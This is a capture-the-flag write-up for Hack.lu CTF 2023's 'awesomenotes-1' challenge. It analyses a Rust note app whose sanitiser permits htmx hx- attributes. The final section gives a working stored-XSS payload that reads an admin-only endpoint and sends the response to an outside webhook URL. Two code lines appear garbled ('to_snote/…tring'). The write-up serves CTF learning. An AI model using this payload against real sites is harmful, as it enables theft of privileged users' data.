---
title: awesomenotes-1 - Hacklu CTF  2023
date: 2023-10-18 18:33:22
author: L0xm1
author_url: https://twitter.com/L0xm1_07
categories:
  - Web
tags:
  - HackluCTF
---

**tl;dr**

+  XSS using hx- attribute to fetch the flag from /api/note/flag.

<!--more-->
**Challenge points**: 88
**No. of solves**: 88
**Solved by**: [ma1f0y](https://twitter.com/mal_f0y),[lu513n](https://twitter.com/Lu513n),[L0xm1](https://twitter.com/L0xm1_07)
 
## Challenge Description
We're excited to announce our new, revolutionary product: A note-taking app. This phenomenal product uses the most up-to-date, bleeding-edge tech in order to stay ahead of all potential security issues. No-one can pwn us

**Challenge Link:** https://awesomenotes.online/

A note creating platform is given. We can create notes at /create endpoint and when we upload the notes, we get redirected to **/note/<note id>** endpoint.

![](note1.png)


![](note2.png)

A **/report** endpoint is there where we can report a particular note and the admin will visit the note.

![](note3.png)


Our aim is to get xss and make the admin visit **/api/note/flag** and send the flag to our webhook.

The source code for the challenge has been given. Lets dive into it.

**main.rs**

```rust
use axum::{
    extract::Multipart,
    extract::Path,
    headers::Cookie,
    http::{header::LOCATION, HeaderMap, HeaderValue, StatusCode},
    response::Html,
    routing::{get, post},
    Form, Router, TypedHeader,
};
use serde::Deserialize;
use std::{fs, io::Read};
use tower_http::services::ServeDir;
use maplit::hashset;

#[derive(Deserialize)]
struct Report {
    link: String,
    #[serde(rename = "g-recaptcha-response")]
    captcha: String,
}

#[tokio::main]
async fn main() {
    // build our application with a single route
    let app = Router::new()
        .route("/", get(home))
        .route("/create", get(create))
        .route("/report", get(report))
        .route("/note/:note", get(note))
        .route("/api/report", post(take_report))
        .route("/api/note/:note", get(get_note))
        .route("/api/note", post(upload_note))
        .nest_service("/static", ServeDir::new("public/static"));
    // run it with hyper on localhost:3000
    let server =
        axum::Server::bind(&"0.0.0.0:3000".parse().unwrap()).serve(app.into_make_service());
    println!("🚀 App running on 0.0.0.0:3000 🚀");
    server.await.unwrap();
}

// which calls one of these handlers
async fn home() -> Html<String> {
    Html(fs::read_to_string("public/index.html").expect("Missing html files"))
}

async fn report() -> Html<String> {
    Html(fs::read_to_string("public/report.html").expect("Missing html files"))
}

async fn create() -> Html<String> {
    Html(fs::read_to_string("public/create.html").expect("Missing html files"))
}

async fn note() -> Html<String> {
    Html(fs::read_to_string("public/note.html").expect("Missing html files"))
}

//API
async fn get_note(
    Path(note): Path<String>,
    TypedHeader(cookie): TypedHeader<Cookie>,
) -> Result<Html<String>, (StatusCode, &'static str)> {
    if &note == "flag" {
        let Some(name) = cookie.get("session") else {
            return Err((StatusCode::UNAUTHORIZED, "Missing session cookie"));
        };
        if name != std::env::var("ADMIN_SESSION").expect("Missing ADMIN_SESSION") {
            return Err((
                StatusCode::UNAUTHORIZED,
                "You are not allowed to read this note",
            ));
        }
        return Ok(Html(fs::read_to_string("flag.txt").expect("Flag missing")));
    }
    if note.chars().any(|c| !c.is_ascii_hexdigit()) {
        return Err((StatusCode::BAD_REQUEST, "Malformed note ID"));
    }
    let Ok(note) = fs::read_to_string(format!("public/upload/{:}", note)) else {
        return Err((StatusCode::NOT_FOUND, "Note not found"));
    };
    Ok(Html(note))
}

async fn upload_note(
    mut multipart: Multipart,
) -> (StatusCode, Result<HeaderMap<HeaderValue>, &'static str>) {
    let mut     body: Option<String> = None;
    while let Some(field) = multipart.next_field().await.unwrap() {
        let Some(name) = field.name() else { continue };
        if name != "note" {
            continue;
        }
        let Ok(data) = field.text().await else {
            continue;
        };
        body = Some(data);
        break;
    }
    let Some(body) = body else {
        return (StatusCode::BAD_REQUEST, Err("Malformed formdata"));
    };
    if body.len() > 5000 {
        return (StatusCode::PAYLOAD_TOO_LARGE, Err("Note too big"));
    }
    let safe = ammonia::Builder::new()
        .tags(hashset!["h1", "p", "div"])
        .add_generic_attribute_prefixes(&["hx-"])
        .clean(&body)
        .to_snote/bab8ac3ff29e46f9e5ae1be75bc4e6f6c608214fc4ada541194404c5150f86e9tring();
    let mut name = [0u8; 32];
    fs::File::open("/dev/urandom")
        .unwrap()
        .read_exact(&mut name)
        .expect("Failed to read urandom");
    let name = String::from_iter(name.map(|c| format!("{:02x}", c)));
    fs::write(format!("public/upload/{:}", name), safe).expect("Failed to write note");
    (
        StatusCode::FOUND,
        Ok(HeaderMap::from_iter([(
            LOCATION,
            format!("/note/{:}", name).parse().unwrap(),
        )])),
    )
}

async fn take_report(Form(report): Form<Report>) -> Result<String, (StatusCode, &'static str)> {
    let params = [("link", report.link), ("recaptcha", report.captcha)];
    let client = reqwest::Client::new();
    let res = client
        .post(format!(
            "http://{:}",
            std::env::var("BOT_HOST").expect("Missing BOT_HOST")
        ))
        .form(&params)
        .send()
        .await
        .expect("Can't request bot");
    if res.status() != StatusCode::OK {
        return Err((StatusCode::BAD_REQUEST, "Report failed"));
    }
    Ok(
        std::fs::read_to_string("public/static/fragment/report_success.html")
            .expect("Missing fragment"),
    )
}
```

In the **get_note()** function, it checks if the path is equal to `/note/flag` ,  and checks the session is equal to admins’ session then the flag is returned else **"You are not allowed to read this note”** message ****is returned. So only an admin can visit the  `/note/flag` endpoint.

In the **upload_note()** function, sanitization is applied on the body of the note using the ammonia parser. Ammonia is a whitelist-based HTML sanitization library in rust https://github.com/rust-ammonia/ammonia/ .

```jsx
let safe = ammonia::Builder::new()
        .tags(hashset!["h1", "p", "div"])
        .add_generic_attribute_prefixes(&["hx-"])
        .clean(&body)
        .to_snote/bab8ac3ff29e46f9e5ae1be75bc4e6f6c608214fc4ada541194404c5150f86e9tring();
```

In the above code snippet, only `<h1>` `<p>` and `<div>` is allowed. Also any attribute starting with `hx-` will be allowed. 

In the given source code, htmx library https://htmx.org/ is used, which is used for building web applications with native JavaScript.

In note.html, the hx- attribute is used.

```jsx
<div 
    class="note-body glow-red note-body-loading" 
    hx-get="/api/note/" 
    hx-on::config-request="event.detail.path += window.location.pathname.split('/').pop()"
    hx-on::after-swap="let l = event.detail.target;
    l.parentNode.classList.add('note-body-done', 'glow-green');
    l.parentNode.classList.remove('note-body-loading', 'glow-red'); 
    "
    hx-trigger="load delay:0.001s"
    hx-target="find #content">
<div id="content"></div>
```

`hx-get` → htmx fetches content from **/api/note** endpoint.

`hx-on:config-request`→ Sets up an event handler for the "config-request" event. When this event is triggered, the provided JavaScript code will be executed.

`hx-trigger`→This attribute specifies when the request should be triggered.

`hx-target`→ Specifies where the response from the server should be placed in the DOM.

We can use `hx-on` to execute the javascript code. Since `<div>` and `hx-` is allowed in the ammonia parser, we can use this to get xss.

**Final Payload**
Create a note with the following content.

```jsx
<div
 hx-get="/api/note/flag" 
 hx-on::load="fetch('/api/note/flag').then(x => x.text()).then((x)=>location='https://webhook.site/7a888fca-6ff6-48d0-b2af-33f47ab05ab5?x='+encodeURIComponent(x)) "
 hx-trigger="load delay:0.001s"
 hx-target="this">
</div>
```

 `hx-get="/api/note/flag"` → to fetch the content from **/api/note/flag**

`hx-on::load="fetch('/api/note/flag').then(x => x.text()).then((x)=>location='https://webhook.site/7a888fca-6ff6-48d0-b2af-33f47ab05ab5?x='+encodeURIComponent(x)) "`
→ the content from /api/note/flag is fetched and sent to my webhook with the response as a query parameter.

Report the note link to /report endpoint. When the admin visits the note, content from /api/note/flag is fetched and sent to my webhook as a query parameter.

```html
Good job user, <br> here's your flag. <br> <br> flag{C3r34l_1s_s0up_l1k3_1f_4gr33}
```

**Flag:** `flag{C3r34l_1s_s0up_l1k3_1f_4gr33}`